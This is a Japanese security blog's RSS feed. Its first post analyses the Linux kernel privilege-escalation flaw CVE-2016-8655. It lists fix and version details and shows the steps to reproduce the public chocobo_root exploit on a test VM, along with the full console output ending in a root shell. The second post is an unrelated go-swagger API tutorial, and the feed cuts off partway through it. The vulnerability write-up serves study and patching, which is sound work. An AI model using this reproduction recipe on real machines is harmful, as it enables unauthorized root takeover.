<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Kosuke Shimofuji's Home Page</title>
    <description>Think about cyber warfare, business warfare.
</description>
    <link>https://kosukeshimofuji.jp/</link>
    <atom:link href="https://kosukeshimofuji.jp/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 12 Dec 2016 17:23:56 +0900</pubDate>
    <lastBuildDate>Mon, 12 Dec 2016 17:23:56 +0900</lastBuildDate>
    <generator>Jekyll v3.2.1</generator>
    
      <item>
        <title>CVE-2016-8655 - Linux af_packet.c race condition (local root)</title>
        <description>&lt;h1 id=&quot;cve-2016-8655&quot;&gt;CVE-2016-8655&lt;/h1&gt;

&lt;h2 id=&quot;section&quot;&gt;概要&lt;/h2&gt;

&lt;p&gt;Linux Kernelのnet/packet/af_packet.cにはrace conditionの脆弱性が存在し、一般ユーザ権限からroot権限に昇格することができます。&lt;/p&gt;

&lt;p&gt;packet_set_ringは、リングバッファを作成すると、パケットのバージョンがTPACKET_V3である場合には、構造体timer_listを初期化します。
この値は、packet_set_ringが終了する前にTPACKET_V1にバージョンを設定するしsetsockoptを呼び出し、別のスレッドによってレースをすることができます。
この問題はtimer_list構造体のuse-after-free脆弱性につながり、結果的にroot権限の奪取につながります。
本脆弱性はpacket_set_ringの開始時にロックをしながらパケットのバージョンを変更するときにpacket_setsockoptにlock_sock（SK）を取ることによって修正されています。&lt;/p&gt;

&lt;h2 id=&quot;cvss-v3&quot;&gt;CVSS v3&lt;/h2&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;CVSS v3 Base Score&lt;/td&gt;
      &lt;td&gt;7.8 High&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Vector&lt;/td&gt;
      &lt;td&gt;CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Impact Score&lt;/td&gt;
      &lt;td&gt;5.9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Exploitability Score&lt;/td&gt;
      &lt;td&gt;1.8&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attack Vector (AV)&lt;/td&gt;
      &lt;td&gt;Local&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attack Complexity (AC)&lt;/td&gt;
      &lt;td&gt;Low&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Privileges Required (PR)&lt;/td&gt;
      &lt;td&gt;Low&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;User Interaction (UI)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Scope (S)&lt;/td&gt;
      &lt;td&gt;Unchanged&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Confidentiality (C)&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Integrity (I)&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Availability (A)&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;section-1&quot;&gt;解決策、緩和策情報&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Linux Kernel 4.8.14以上へのアップグレード&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-2&quot;&gt;影響を受けるソフトウェアとバージョン&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Linux Kernel 4.8.13以前&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-3&quot;&gt;技術的な詳細&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;本脆弱性が混入した&lt;a href=&quot;https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a&quot;&gt;コミット&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;修正&lt;a href=&quot;https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c&quot;&gt;コミット&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;exploit&quot;&gt;Exploitの動作検証&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/40871/&quot;&gt;chocobo_root.c&lt;/a&gt;に適合する環境の用意&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@CVE-2016-8655 ~ $ sudo apt-get install linux-image-4.4.0-51-generic linux-headers-4.4.0-51-generic
kosuke@CVE-2016-8655 ~ $ sudo apt-get remove linux-image-4.4.0-53-generic linux-headers-4.4.0-53-generic
kosuke@CVE-2016-8655 ~ $ sudo reboot
kosuke@CVE-2016-8655 ~ $ uname -a
Linux CVE-2016-8655.test 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
kosuke@CVE-2016-8655 ~ $ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.1 LTS
Release:        16.04
Codename:       xenial
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;コンパイルとファイルケーパビリティの設定&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@CVE-2016-8655 ~ $ gcc chocobo_root.c -o chocobo_root -lpthread
kosuke@CVE-2016-8655 ~ $ ls -l chocobo_root
-rwxrwxr-x 1 kosuke kosuke 26856 12月  9 16:05 chocobo_root
kosuke@CVE-2016-8655 ~ $ sudo apt-get install libcap2-bin
kosuke@CVE-2016-8655 ~ $ sudo setcap cap_net_raw+ep /home/kosuke/chocobo_root
kosuke@CVE-2016-8655 ~ $ getcap ./chocobo_root
./chocobo_root = cap_net_raw+ep
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;実行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@CVE-2016-8655 ~ $ ./chocobo_root
linux AF_PACKET race condition exploit by rebel
kernel version: 4.4.0-51-generic #72
proc_dostring = 0xffffffff81088090
modprobe_path = 0xffffffff81e48f80
register_sysctl_table = 0xffffffff812879a0
set_memory_rw = 0xffffffff8106f320
exploit starting
making vsyscall page writable..

new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 102949, last val = 0)
current packet version = 2
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 122693, last val = 0)
current packet version = 2
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 124639, last val = 2)
current packet version = 0
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 &amp;amp;&amp;amp; offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying..
vsyscall page altered!


stage 1 completed
registering new sysctl..

new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 564981, last val = 2)
current packet version = 0
pbd-&amp;gt;hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 &amp;amp;&amp;amp; offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying..
sysctl added!

stage 2 completed
binary executed by kernel, launching rootshell
root@CVE-2016-8655 ~ # id
uid=0(root) gid=0(root) groups=0(root),1001(kosuke)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;section-4&quot;&gt;まとめ&lt;/h2&gt;

&lt;p&gt;サービスに侵入できる穴があったとして、その権限でcap_net_rawケーパビリティを持ったファイル、もしくはプロセスの挙動を変更できるのであれば本脆弱性によりrootを奪取される可能性がある。&lt;/p&gt;

&lt;h2 id=&quot;section-5&quot;&gt;追跡が必要な情報源&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/byid?query=CVE-2016-8655&amp;amp;searchview=&quot;&gt;CERT&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2016-8655&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/search?q=&amp;quot;CVE-2016-8655&amp;quot;&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lwn.net/Search/DoSearch?words=CVE-2016-8655&quot;&gt;LWN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-8655&quot;&gt;NVD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/search/?q=CVE-2016-8655&quot;&gt;PacketStorm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2016-8655&quot;&gt;Redhat&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://people.canonical.com/~ubuntu-security/cve/CVE-2016-8655.html&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-8655&amp;amp;l=bugtraq&quot;&gt;bugtraq&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-8655&quot;&gt;bugzilla&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.centos.org/forums/search.php?keywords=CVE-2016-8655&quot;&gt;centos&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2016-8655/&quot;&gt;cvedetail&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/search/?action=search&amp;amp;cve=2016-8655&quot;&gt;exploitdb&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-8655&amp;amp;l=full-disclosure&quot;&gt;fulldisc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/db/search?q=CVE-2016-8655&quot;&gt;metasploit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-8655&amp;amp;l=oss-security&quot;&gt;oss-sec&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://twitter.com/search?q=CVE-2016-8655&quot;&gt;twitter&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;section-6&quot;&gt;参考文献&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;http://securityaffairs.co/wordpress/54168/hacking/cve-2016-8655-linux-kernel.html&lt;/li&gt;
  &lt;li&gt;http://seclists.org/oss-sec/2016/q4/607&lt;/li&gt;
  &lt;li&gt;https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c&lt;/li&gt;
  &lt;li&gt;http://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-006125.html&lt;/li&gt;
  &lt;li&gt;https://wiki.archlinuxjp.org/index.php/%E3%82%B1%E3%82%A4%E3%83%91%E3%83%93%E3%83%AA%E3%83%86%E3%82%A3&lt;/li&gt;
  &lt;li&gt;http://www.vagrantbox.es/&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Fri, 09 Dec 2016 11:55:00 +0900</pubDate>
        <link>https://kosukeshimofuji.jp/2016/12/09/CVE-2016-8655/</link>
        <guid isPermaLink="true">https://kosukeshimofuji.jp/2016/12/09/CVE-2016-8655/</guid>
        
        
        <category>vlunerability</category>
        
      </item>
    
      <item>
        <title>go-swaggerとauthentication</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://kosukeshimofuji.jp/2016/12/02/swagger/&quot;&gt;Swaggerによるrestful
apiの定義&lt;/a&gt;ではswaggerの概要とgo-swaggerを使用してRESTful
APIのデフォルトの挙動を確認した。
本記事では、API SERVERとCLIENTを作成し、認証を行った上で、データの追加と読み取りまでを実装することを目標とする。&lt;/p&gt;

&lt;h1 id=&quot;section&quot;&gt;生成されるコードについての調査&lt;/h1&gt;

&lt;p&gt;go-swaggerが生成するコードの詳細をさらに知るには以下のドキュメントと生成されたコードを読んでいく必要がある。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://goswagger.io/generate/client.html&quot;&gt;API Client&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://goswagger.io/generate/server.html&quot;&gt;API Server&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;section-1&quot;&gt;サーバコードの生成とビルド&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://goswagger.io/tutorial/todo-list.html&quot;&gt;goswagger.io&lt;/a&gt;のTodo List Tutorialの&lt;a href=&quot;https://gist.github.com/KosukeShimofuji/7bc60bfaf2173bcade4ea6d637804bee&quot;&gt;swaggerの定義&lt;/a&gt;を拝借する。
swaggerの定義からどのように関数名、object名、model名などを決定するかは&lt;a href=&quot;https://goswagger.io/use/schemas.html&quot;&gt;scheme generator&lt;/a&gt;を読めばわかる。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ swagger validate /tmp/swagger.yml
The swagger spec at &quot;/tmp/swagger.yml&quot; is valid against swagger specification
2.0
$ swagger generate server -A TodoList -f /tmp/swagger.yml
$ tree
.
├── cmd
│   └── todo-list-server
│       └── main.go
├── models
│   ├── error.go
│   └── item.go
├── restapi
   ├── configure_todo_list.go
   ├── doc.go
   ├── embedded_spec.go
   ├── operations
   │   ├── todo_list_api.go
   │   └── todos
   │       ├── get.go
   │       ├── get_parameters.go
   │       ├── get_responses.go
   │       └── get_urlbuilder.go
   └── server.go

6 directories, 13 files

$ go get github.com/go-openapi/runtime
$ go get github.com/tylerb/graceful
$ go get github.com/jessevdk/go-flags
$ go get golang.org/x/net/context
$ go get github.com/go-openapi/analysis
$ go get github.com/go-openapi/loads
$ go get github.com/go-openapi/spec
$ go get github.com/go-openapi/validate
$ go get github.com/gorilla/context
$ go get github.com/docker/go-units
$ go install ./cmd/todo-list-server/
$ todo-list-server -h
Usage:
  todo-list-server [OPTIONS]

The product of a tutorial on goswagger.io

Application Options:
      --scheme=            the listeners to enable, this can be repeated and defaults to the schemes in the swagger spec
      --cleanup-timeout=   grace period for which to wait before shutting down the server (default: 10s)
      --max-header-size=   controls the maximum number of bytes the server will read parsing the request header's keys and values, including the request line. It does not limit the size of the request body.
                           (default: 1MiB)
      --socket-path=       the unix socket to listen on (default: /var/run/todo-list.sock)
      --host=              the IP to listen on (default: localhost) [$HOST]
      --port=              the port to listen on for insecure connections, defaults to a random value [$PORT]
      --listen-limit=      limit the number of outstanding requests
      --keep-alive=        sets the TCP keep-alive timeouts on accepted connections. It prunes dead TCP connections ( e.g. closing laptop mid-download) (default: 3m)
      --read-timeout=      maximum duration before timing out read of the request (default: 30s)
      --write-timeout=     maximum duration before timing out write of the response (default: 60s)
      --tls-host=          the IP to listen on for tls, when not specified it's the same as --host [$TLS_HOST]
      --tls-port=          the port to listen on for secure connections, defaults to a random value [$TLS_PORT]
      --tls-certificate=   the certificate to use for secure connections [$TLS_CERTIFICATE]
      --tls-key=           the private key to use for secure conections [$TLS_PRIVATE_KEY]
      --tls-listen-limit=  limit the number of outstanding requests
      --tls-keep-alive=    sets the TCP keep-alive timeouts on accepted connections. It prunes dead TCP connections ( e.g. closing laptop mid-download)
      --tls-read-timeout=  maximum duration before timing out read of the request
      --tls-write-timeout= maximum duration before timing out write of the response

Help Options:
  -h, --help               Show this help message
$ todo-list-server --scheme=http
2016/12/05 12:53:31 Serving todo list at http://127.0.0.1:47321
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;api&quot;&gt;APIのテストと修正&lt;/h1&gt;

&lt;p&gt;go-swaggerで生成されたserverはデフォルト状態ではすべてのAPIは未実装になっている。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i http://127.0.0.1:47321
HTTP/1.1 501 Not Implemented
Content-Type: application/io.goswagger.examples.todo-list.v1+json
Date: Mon, 05 Dec 2016 03:56:38 GMT
Content-Length: 51

&quot;operation todos.Get has not yet been implemented&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;configure_todo_list.goを&lt;a href=&quot;https://github.com/go-swagger/go-swagger/blob/master/examples/tutorials/todo-list/server-complete/restapi/configure_todo_list.go&quot;&gt;tutorial&lt;/a&gt;を参考に修正することにより、モック的な動作にはなるがAPIを実装することができる。&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webshkiller@wsk-control ~/go/src/github.com/KosukeShimofuji/todos $ git diff
&lt;span class=&quot;gh&quot;&gt;diff --git a/restapi/configure_todo_list.go b/restapi/configure_todo_list.go
index 9c5f86c..47f495b 100644
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/restapi/configure_todo_list.go
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/restapi/configure_todo_list.go
&lt;/span&gt;&lt;span class=&quot;gu&quot;&gt;@@ -3,23 +3,96 @@ package restapi
&lt;/span&gt; import (
        &quot;crypto/tls&quot;
        &quot;net/http&quot;
&lt;span class=&quot;gi&quot;&gt;+       &quot;sync&quot;
+       &quot;sync/atomic&quot;
&lt;/span&gt;
        errors &quot;github.com/go-openapi/errors&quot;
        runtime &quot;github.com/go-openapi/runtime&quot;
        middleware &quot;github.com/go-openapi/runtime/middleware&quot;
&lt;span class=&quot;gi&quot;&gt;+       &quot;github.com/go-openapi/swag&quot;
&lt;/span&gt;
&lt;span class=&quot;gi&quot;&gt;+       &quot;github.com/KosukeShimofuji/todos/models&quot;
&lt;/span&gt;        &quot;github.com/KosukeShimofuji/todos/restapi/operations&quot;
        &quot;github.com/KosukeShimofuji/todos/restapi/operations/todos&quot;
 )

&lt;span class=&quot;gd&quot;&gt;-// This file is safe to edit. Once it exists it will not be overwritten
-
&lt;/span&gt; //go:generate swagger generate server --target .. --name TodoList --spec ../../../../../../../../tmp/swagger.yml

 func configureFlags(api *operations.TodoListAPI) {
        // api.CommandLineOptionsGroups = []swag.CommandLineOptionsGroup{ ... }
 }

&lt;span class=&quot;gi&quot;&gt;+// This file is safe to edit. Once it exists it will not be overwritten
+
+// the variables we need throughout our implementation
+var items = make(map[int64]*models.Item)
+var lastID int64
+
+var itemsLock = &amp;amp;sync.Mutex{}
+
+func newItemID() int64 {
+       return atomic.AddInt64(&amp;amp;lastID, 1)
+}
+
+func addItem(item *models.Item) error {
+       if item == nil {
+               return errors.New(500, &quot;item must be present&quot;)
+       }
+
+       itemsLock.Lock()
+       defer itemsLock.Unlock()
+
+	newID := newItemID()
+	item.ID = newID
+	items[newID] = item
+
+	return nil
+}
+
+func updateItem(id int64, item *models.Item) error {
+       if item == nil {
+               return errors.New(500, &quot;item must be present&quot;)
+       }
+
+       itemsLock.Lock()
+       defer itemsLock.Unlock()
+
+       _, exists := items[id]
+       if !exists {
+               return errors.NotFound(&quot;not found: item %d&quot;, id)
+       }
+
+       item.ID = id
+       items[id] = item
+       return nil
+}
+
+func deleteItem(id int64) error {
+       itemsLock.Lock()
+       defer itemsLock.Unlock()
+
+       _, exists := items[id]
+       if !exists {
+               return errors.NotFound(&quot;not found: item %d&quot;, id)
+       }
+
+       delete(items, id)
+       return nil
+}
+
+func allItems(since int64, limit int32) (result []*models.Item) {
+       result = make([]*models.Item, 0)
+       for id, item := range items {
+               if len(result) &amp;gt;= int(limit) {
+                       return
+               }
+               if since == 0 || id &amp;gt; since {
+                       result = append(result, item)
+               }
+       }
+       return
+}
+
&lt;/span&gt; func configureAPI(api *operations.TodoListAPI) http.Handler {
        // configure the api here
        api.ServeError = errors.ServeError
&lt;span class=&quot;gu&quot;&gt;@@ -35,16 +108,31 @@ func configureAPI(api *operations.TodoListAPI) http.Handler {
&lt;/span&gt;        api.JSONProducer = runtime.JSONProducer()

        api.TodosAddOneHandler = todos.AddOneHandlerFunc(func(params todos.AddOneParams) middleware.Responder {
&lt;span class=&quot;gd&quot;&gt;-               return middleware.NotImplemented(&quot;operation todos.AddOne has not yet been implemented&quot;)
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+               if err := addItem(params.Body); err != nil {
+                       return todos.NewAddOneDefault(500).WithPayload(&amp;amp;models.Error{Code: 500, Message: swag.String(err.Error())})
+               }
+               return todos.NewAddOneCreated().WithPayload(params.Body)
&lt;/span&gt;        })
        api.TodosDestroyOneHandler = todos.DestroyOneHandlerFunc(func(params todos.DestroyOneParams) middleware.Responder {
&lt;span class=&quot;gd&quot;&gt;-               return middleware.NotImplemented(&quot;operation todos.DestroyOne has not yet been implemented&quot;)
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+               delete(items, params.ID)
+               return todos.NewDestroyOneNoContent()
&lt;/span&gt;        })
        api.TodosFindTodosHandler = todos.FindTodosHandlerFunc(func(params todos.FindTodosParams) middleware.Responder {
&lt;span class=&quot;gd&quot;&gt;-               return middleware.NotImplemented(&quot;operation todos.FindTodos has not yet been implemented&quot;)
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+               mergedParams := todos.NewFindTodosParams()
+               mergedParams.Since = swag.Int64(0)
+               if params.Since != nil {
+                       mergedParams.Since = params.Since
+               }
+               if params.Limit != nil {
+                       mergedParams.Limit = params.Limit
+               }
+               return todos.NewFindTodosOK().WithPayload(allItems(*mergedParams.Since, *mergedParams.Limit))
&lt;/span&gt;        })
        api.TodosUpdateOneHandler = todos.UpdateOneHandlerFunc(func(params todos.UpdateOneParams) middleware.Responder {
&lt;span class=&quot;gd&quot;&gt;-               return middleware.NotImplemented(&quot;operation todos.UpdateOne has not yet been implemented&quot;)
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+               if err := updateItem(params.ID, params.Body); err != nil {
+                       return todos.NewUpdateOneDefault(500).WithPayload(&amp;amp;models.Error{Code: 500, Message: swag.String(err.Error())})
+               }
+               return todos.NewUpdateOneOK().WithPayload(params.Body)
&lt;/span&gt;        })

        api.ServerShutdown = func() {}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ITEMの追加&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i 127.0.0.1:59695 -d &quot;{\&quot;description\&quot;:\&quot;Add item 001\&quot;}&quot; -H 'Content-Type: application/io.goswagger.examples.todo-list.v1+json'
HTTP/1.1 201 Created
Content-Type: application/io.goswagger.examples.todo-list.v1+json
Date: Mon, 05 Dec 2016 06:15:28 GMT
Content-Length: 38

{&quot;description&quot;:&quot;Add item 001&quot;,&quot;id&quot;:1}

$ curl -i 127.0.0.1:59695 -d &quot;{\&quot;description\&quot;:\&quot;Add item 002\&quot;}&quot; -H 'Content-Type: application/io.goswagger.examples.todo-list.v1+json'
HTTP/1.1 201 Created
Content-Type: application/io.goswagger.examples.todo-list.v1+json
Date: Mon, 05 Dec 2016 06:16:00 GMT
Content-Length: 38

{&quot;description&quot;:&quot;Add item 002&quot;,&quot;id&quot;:2}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ITEMの閲覧&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i 127.0.0.1:59695
HTTP/1.1 200 OK
Content-Type: application/io.goswagger.examples.todo-list.v1+json
Date: Mon, 05 Dec 2016 06:16:40 GMT
Content-Length: 78

[{&quot;description&quot;:&quot;Add item 001&quot;,&quot;id&quot;:1},{&quot;description&quot;:&quot;Add item 002&quot;,&quot;id&quot;:2}]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ITEMの編集&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i -X PUT 127.0.0.1:59695/1 -d &quot;{\&quot;description\&quot;:\&quot;modify\&quot;}&quot; -H 'Content-Type: application/io.goswagger.examples.todo-list.v1+json'
HTTP/1.1 200 OK
Content-Type: application/io.goswagger.examples.todo-list.v1+json
Date: Mon, 05 Dec 2016 06:19:24 GMT
Content-Length: 32

{&quot;description&quot;:&quot;modify&quot;,&quot;id&quot;:1}

$ curl -i 127.0.0.1:59695
HTTP/1.1 200 OK
Content-Type: application/io.goswagger.examples.todo-list.v1+json
Date: Mon, 05 Dec 2016 06:19:43 GMT
Content-Length: 72

[{&quot;description&quot;:&quot;modify&quot;,&quot;id&quot;:1},{&quot;description&quot;:&quot;Add item 002&quot;,&quot;id&quot;:2}]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ITEMの削除&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i -X DELETE 127.0.0.1:59695/1
HTTP/1.1 204 No Content
Content-Type: application/io.goswagger.examples.todo-list.v1+json
Date: Mon, 05 Dec 2016 06:20:32 GMT

$ curl -i 127.0.0.1:59695
HTTP/1.1 200 OK
Content-Type: application/io.goswagger.examples.todo-list.v1+json
Date: Mon, 05 Dec 2016 06:20:39 GMT
Content-Length: 40

[{&quot;description&quot;:&quot;Add item 002&quot;,&quot;id&quot;:2}]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;section-2&quot;&gt;クライアントコードの生成とビルド&lt;/h1&gt;

&lt;p&gt;クライアントを生成して、サーバにリクエストを飛ばしてみる。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ todo-list-server --scheme=http
2016/12/05 17:47:00 Serving todo list at http://127.0.0.1:53283
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;go-swaggerでクライアント関連のコードを生成する。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ swagger generate client -A TodoList -f /tmp/swagger.yml
$ tree
.
├── client
    ├── todo_list_client.go
    └── todos
        ├── add_one_parameters.go
        ├── add_one_responses.go
        ├── destroy_one_parameters.go
        ├── destroy_one_responses.go
        ├── find_todos_parameters.go
        ├── find_todos_responses.go
        ├── todos_client.go
        ├── update_one_parameters.go
        └── update_one_responses.go
$ go get github.com/go-openapi/spec
$ go get github.com/go-openapi/strfmt
$ go get github.com/go-openapi/runtime/client
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;生成されたコードを利用すれば、すぐにクライアントを書くことができる。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;client.go&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;x&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fmt&quot;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;
